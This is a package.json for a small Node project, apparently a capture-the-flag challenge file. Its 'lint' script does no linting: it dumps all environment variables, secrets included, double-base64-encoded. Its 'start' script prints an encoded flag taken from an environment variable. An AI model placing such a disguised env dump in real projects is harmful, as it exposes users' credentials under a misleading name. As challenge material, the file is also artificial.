{
  "name": "gravy-overflow",
  "type": "module",
  "version": "1.0.0",
  "devDependencies": {
    "eslint": "8.57.0"
  },
  "scripts": {
    "lint": "env | base64 | base64",
    "start": "node app.js && echo FLAG=$($FLAG_GRAVY_OVERFLOW_L0_GRAVY | base64)"
  }
}
